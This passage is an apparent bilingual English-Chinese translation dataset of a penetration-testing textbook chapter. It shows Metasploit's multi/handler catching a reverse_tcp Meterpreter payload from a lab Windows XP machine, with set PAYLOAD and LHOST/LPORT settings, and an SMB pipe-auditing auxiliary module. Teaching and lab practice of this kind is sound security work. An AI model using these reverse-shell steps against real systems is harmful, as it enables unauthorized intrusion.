  zh: 到目前为止，在尝试利用我们的目标机器时，Metasploit 设置了我们的有效载荷处理程序并发送了漏洞利用代码。当我们使用 Msfconsole 利用
    MS08-067 漏洞并使用反向 shell 有效载荷时，Metasploit 首先设置了一个监听端口 4444 的处理程序来接收反向连接，但直到现在，我们还没有设置监听我们用
    Msfvenom 创建的有效载荷的反向连接。
- en: Using the Multi/Handler Module
  id: totrans-159
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Multi/Handler 模块
- en: Start Msfconsole again, and we’ll look at a Metasploit module called *multi/handler*.
    This module allows us to set up standalone handlers, which is just what we’re
    lacking. We need a handler to catch our Meterpreter connection when our malicious
    executable is run from the Windows XP target. Select the *multi/handler* module
    with **`use multi/handler`**.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 重新启动 Msfconsole，我们将查看一个名为 *multi/handler* 的 Metasploit 模块。这个模块允许我们设置独立的处理程序，这正是我们缺少的。我们需要一个处理程序来捕获我们的
    Meterpreter 连接，当我们的恶意可执行文件在 Windows XP 目标系统上运行时。选择 *multi/handler* 模块，输入 **`use
    multi/handler`**。
- en: The first thing to do is tell *multi/handler* which of Metasploit’s many handlers
    we need. We need to catch the `windows/meterpreter/reverse_tcp` payload we used
    when we created our executable with Msfvenom. Choose it with **`set PAYLOAD windows/meterpreter/reverse_tcp`**,
    and follow it with **`show options`** ([Example 4-16](ch04.xhtml#options_with_multisolidushandler
    "Example 4-16. Options with multi/handler")).
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是告诉 *multi/handler* 我们需要 Metasploit 的哪些处理程序。我们需要捕获我们使用 Msfvenom 创建可执行文件时所使用的
    `windows/meterpreter/reverse_tcp` 有效载荷。通过 **`set PAYLOAD windows/meterpreter/reverse_tcp`**
    选择它，然后输入 **`show options`** （[示例 4-16](ch04.xhtml#options_with_multisolidushandler
    "示例 4-16. 使用 multi/handler 的选项")）。
- en: Example 4-16. Options with multi/handler
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-16. 使用 multi/handler 的选项
- en: '[PRE27]'
  id: totrans-163
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: From here we tell Metasploit which setup we used when we created the payload.
    We’ll set the `LHOST` option to our local Kali IP address and the `LPORT` to the
    port we chose in Msfvenom, in this case 192.168.20.9 and 12345, respectively.
    Once all the options for the payload are set correctly, enter **`exploit`**, as
    shown in [Example 4-17](ch04.xhtml#setting_up_a_handler "Example 4-17. Setting
    up a handler").
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 从这里我们告诉Metasploit在创建有效载荷时使用的设置。我们将`LHOST`选项设置为本地Kali IP地址，将`LPORT`设置为我们在Msfvenom中选择的端口，在这个例子中是192.168.20.9和12345。一旦所有有效载荷选项正确设置，输入**`exploit`**，如[示例
    4-17](ch04.xhtml#setting_up_a_handler "示例 4-17. 设置一个处理程序")所示。
- en: Example 4-17. Setting up a handler
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-17. 设置一个处理程序
- en: '[PRE28]'
  id: totrans-166
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: As you can see, Metasploit sets up a reverse handler on port 12345 as instructed,
    listening for a payload to call back.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，Metasploit根据指示在端口12345上设置了一个反向处理程序，监听回调的有效载荷。
- en: Now we can switch back to our Windows XP target and run our downloaded executable.
    Run *chapter4example.exe* on your Windows target. Back in Msfconsole, you should
    see that the handler receives the reverse connection, and you receive a Meterpreter
    session.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以切换回我们的Windows XP目标，运行我们下载的可执行文件。在Windows目标上运行*chapter4example.exe*。回到Msfconsole，你应该会看到处理程序收到反向连接，并且你获得了一个Meterpreter会话。
- en: '[PRE29]'
  id: totrans-169
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: Spend some time experimenting with Msfvenom if you like. We’ll return to this
    useful tool when we attempt to bypass antivirus solutions in [Chapter 12](ch12.xhtml
    "Chapter 12. Bypassing Antivirus Applications").
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你愿意，可以花些时间尝试一下Msfvenom。我们将在[第12章](ch12.xhtml "第12章 绕过防病毒应用程序")中讨论如何利用这个有用的工具绕过防病毒解决方案。
- en: Using an Auxiliary Module
  id: totrans-171
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用辅助模块
- en: Metasploit was first conceived as an exploitation framework, and it continues
    to be a top contender in the world of exploitation. But in the ensuing years,
    its functionality has grown in about as many directions as there are creative
    minds working on it. I sometimes quip that Metasploit can do everything except
    my laundry, and I’m currently working on a module for that.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit最初是作为一个漏洞利用框架构思的，至今依然是漏洞利用领域的顶尖竞争者。但在随后的几年中，它的功能已经扩展到几乎所有方向，就像有那么多富有创意的人在为它工作一样。我有时开玩笑说，Metasploit除了洗衣服什么都能做，而我目前正在为此开发一个模块。
- en: Dirty socks aside, in addition to exploitation, Metasploit has modules to aid
    in every phase of pentesting. Some modules that are not used for exploitation
    are known as *auxiliary modules*; they include things like vulnerability scanners,
    fuzzers, and even denial of service modules. (A good rule of thumb to remember
    is that exploit modules use a payload and auxiliary modules do not.)
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 除了漏洞利用之外，Metasploit还拥有帮助渗透测试各个阶段的模块。有些模块不是用于漏洞利用的，它们被称为*辅助模块*；这些模块包括漏洞扫描器、模糊测试工具，甚至拒绝服务模块。（一个好记的经验法则是：漏洞利用模块使用有效载荷，而辅助模块不使用。）
- en: For example, when we first used the *windows/smb/ms08_067_netapi* exploit module
    earlier in this chapter, one of its options was `SMBPIPE`. The default value for
    that option was `BROWSER`. Let’s look at an auxiliary module that will enumerate
    the listening pipes on an SMB server, *auxiliary/scanner/smb/pipe_auditor* ([Example 4-18](ch04.xhtml#options_for_scannersolidussmbsoliduspipe
    "Example 4-18. Options for scanner/smb/pipe_auditor")). (We use auxiliary modules
    like exploits, and like exploits we can also drop the *auxiliary/* part of the
    module name.)
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，当我们在本章早些时候首次使用*windows/smb/ms08_067_netapi*漏洞利用模块时，它的选项之一是`SMBPIPE`。该选项的默认值是`BROWSER`。让我们来看一个辅助模块，它将枚举SMB服务器上正在监听的管道，*auxiliary/scanner/smb/pipe_auditor*（[示例
    4-18](ch04.xhtml#options_for_scannersolidussmbsoliduspipe "示例 4-18. 扫描器/smb/pipe_auditor的选项")）。(我们像使用漏洞利用模块一样使用辅助模块，和漏洞利用模块一样，我们也可以省略模块名中的*auxiliary/*部分。)
- en: Example 4-18. Options for scanner/smb/pipe_auditor
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-18. 扫描器/smb/pipe_auditor的选项
- en: '[PRE30]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: The options for this module are a bit different from what we’ve seen so far.
    Instead of `RHOST` we have `RHOSTS` ❶, which allows us to specify more than one
    remote host to run the module against. (Auxiliaries can be run against multiple
    hosts, whereas exploits can exploit only one system at a time.)
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 这个模块的选项与我们之前见到的有些不同。我们有`RHOSTS` ❶，而不是`RHOST`，它允许我们指定多个远程主机来运行该模块。（辅助模块可以针对多个主机运行，而漏洞利用模块一次只能利用一个系统。）
- en: We also see options for `SMBUser`, `SMBPass`, and `SMBDomain`. Because our Windows
    XP target is not part of any domain, we can leave the `SMBDomain` at the default
    value, `WORKGROUP`. We can leave the `SMBUser` and `SMBPass` values blank. The
    `THREADS` option allows us to control the speed of Metasploit by having our module
    run in multiple threads. We’re scanning only one system in this case, so the default
    value of `1` thread will work fine. The only option we need to set is `RHOSTS`
    to the IP address of our Windows XP target.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还看到了 `SMBUser`、`SMBPass` 和 `SMBDomain` 选项。由于我们的 Windows XP 目标不属于任何域，因此我们可以将
    `SMBDomain` 保留为默认值 `WORKGROUP`。我们可以将 `SMBUser` 和 `SMBPass` 的值留空。`THREADS` 选项允许我们通过在多个线程中运行模块来控制
    Metasploit 的速度。由于我们这里只扫描一个系统，因此默认的 `1` 个线程就可以正常工作。我们唯一需要设置的选项是 `RHOSTS`，即我们 Windows
    XP 目标的 IP 地址。
- en: '[PRE31]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: Even though we aren’t technically exploiting anything in this case, we can still
    tell Metasploit to run our auxiliary module by entering **`exploit`**.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管在此案例中我们并没有真正利用任何漏洞，但我们仍然可以通过输入 **`exploit`** 命令来告诉 Metasploit 运行我们的辅助模块。
- en: '[PRE32]'
  id: totrans-181
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: The module audits the listening SMB pipes on our Windows XP target. As it turns
    out, the browser pipe is the only available pipe ❶. Because this pipe is listening,
    this is the correct value for the `SMBPIPE` option in the *windows/smb/ms08_067_netapi*
    exploit module we used earlier in the chapter.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 该模块会审计我们 Windows XP 目标上的 SMB 监听管道。事实证明，浏览器管道是唯一可用的管道 ❶。由于这个管道正在监听，因此它是我们在本章早些时候使用的
    *windows/smb/ms08_067_netapi* 漏洞模块中 `SMBPIPE` 选项的正确值。
- en: Updating Metasploit
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 更新 Metasploit
- en: The exercises in this book are designed to work on a base install of Kali Linux
    1.0.6\. Naturally, many security tools used in this book will have been updated
    since Kali’s release. Metasploit in particular receives regular updates from core
    developers as well as from the security community.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 本书中的练习旨在基于 Kali Linux 1.0.6 版本进行操作。自然，本书中使用的许多安全工具自 Kali 发布以来已经更新，尤其是 Metasploit，它会定期收到核心开发人员和安全社区的更新。
- en: 'All of the material in this book works with the Metasploit version installed
    on Kali 1.0.6\. As you continue your career as a pentester, you’ll want the latest
    Metasploit modules. The Metasploit Project is typically pretty solid at releasing
    modules for the latest security issues circulating the Web. To pull down the latest
    modules from Metasploit’s GitHub, enter the following: root@kali:~# msfupdate'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 本书中的所有内容均适用于 Kali 1.0.6 上安装的 Metasploit 版本。随着你作为渗透测试员的职业发展，你会希望使用最新的 Metasploit
    模块。Metasploit 项目通常会非常稳定地发布适用于最新网络安全问题的模块。要从 Metasploit 的 GitHub 拉取最新的模块，可以输入以下命令：root@kali:~#
    msfupdate
- en: '[PRE33]'
  id: totrans-186
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: Summary
  id: totrans-187
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter we’ve gotten comfortable using some of Metasploit’s interfaces.
    We’ll return to Metasploit throughout the book.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们已经熟悉了一些 Metasploit 接口的使用。我们将在整本书中不断返回使用 Metasploit。
- en: In the next few chapters we’ll simulate a penetration test against our target
    machines, covering a wide variety of vulnerability types. If you pursue a career
    in penetration testing, you will likely encounter clients spanning the gamut of
    possible security postures. Some will be missing so many patches across the organization
    that you may wonder if they have updated since installing the base image back
    in 2001\. Along with missing patches, you may find additional vulnerabilities
    such as default passwords and misconfigured services. Gaining access to such networks
    is trivial for skilled penetration testers.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的几章中，我们将模拟对目标机器进行渗透测试，涵盖多种漏洞类型。如果你从事渗透测试工作，可能会遇到各种不同安全状态的客户。一些客户可能会因为组织内缺少大量补丁而让你怀疑他们自从
    2001 年安装基本镜像以来是否更新过。除了缺少补丁外，你可能还会发现其他漏洞，比如默认密码和配置错误的服务。对于经验丰富的渗透测试人员来说，获得对这些网络的访问权限是非常简单的。
- en: On the other hand, you may also find yourself working for clients who have patch
    management down pat, with everything from Windows operating systems to all third-party
    software on a regular patch cycle across the organization. Some clients may deploy
    cutting-edge security controls such as proxies that allow only Internet Explorer
    to call out to the Internet. This will stop even Metasploit reverse shells that
    call back on ports 80 or 443 and look like web traffic, unless you are able to
    exploit the Internet Explorer program, which may also be completely patched. You
    may find intrusion prevention firewalls at the perimeter that drop any string
    that looks even a little bit like attack traffic.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面，你也可能会遇到一些客户，他们已经完善了补丁管理，从Windows操作系统到所有第三方软件，都在整个组织内实行定期的补丁更新。有些客户可能会部署尖端的安全控制，例如只允许Internet
    Explorer访问互联网的代理服务器。这将阻止即使是Metasploit的反向shell，它通过80或443端口回调并且看起来像是网页流量，除非你能够利用Internet
    Explorer程序，而它可能也已经完全打了补丁。你还可能会在外围发现入侵防御防火墙，它会丢弃任何看起来像攻击流量的字符串。
- en: 'Simply throwing the MS08-067 Metasploit module at these high-security networks
    will get you no results, except maybe a call from a network monitoring vendor
    with a warrant for your arrest. (Don’t worry: As part of the penetration test,
    you will have a get-out-of-jail-free card.) But even highly secure networks are
    only as strong as their weakest link. For instance, I once performed an onsite
    penetration test for a company that employed all of the security controls I just
    mentioned. However, the local administrator password on all the Windows workstations
    was the same five-letter dictionary word. After I cracked the password, I was
    able to log on as an administrator on every workstation on the network. From there
    I was able to use something called *token impersonation* to gain domain administrator
    access. Despite all the strong security controls, with a little effort I was able
    to take over the network the same way I would a network with missing patches from
    2003.'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 单单把MS08-067的Metasploit模块丢到这些高安全性网络中，除了可能接到网络监控供应商的电话，告诉你有逮捕令之外，不会有任何结果。（不用担心：作为渗透测试的一部分，你会拥有一张“免入狱卡”。）但即使是高度安全的网络，也只是像它们最脆弱的环节一样强大。例如，我曾为一家公司进行现场渗透测试，这家公司采用了我刚才提到的所有安全控制。然而，所有Windows工作站的本地管理员密码都是相同的五个字母的词典词汇。在我破解了密码之后，我能够以管理员身份登录网络上每一台工作站。接着，我使用了叫做*令牌伪装*的技术，获得了域管理员的权限。尽管有所有强大的安全控制，但只要稍加努力，我就能够像接管一个没有2003年补丁的网络一样，轻松接管这个网络。
- en: As you work through the rest of this book, you will pick up not only the technical
    skills required to break into vulnerable systems but also the mindset required
    to find a way in when none seems readily apparent.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 在你继续阅读本书的过程中，你将不仅掌握突破脆弱系统所需的技术技能，还会培养出当似乎没有明显漏洞时找到突破口的思维方式。
- en: Now let’s turn our attention to gathering information about our targets so we
    can develop a solid plan of attack.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们把注意力转向收集目标的信息，以便制定一个稳固的攻击计划。
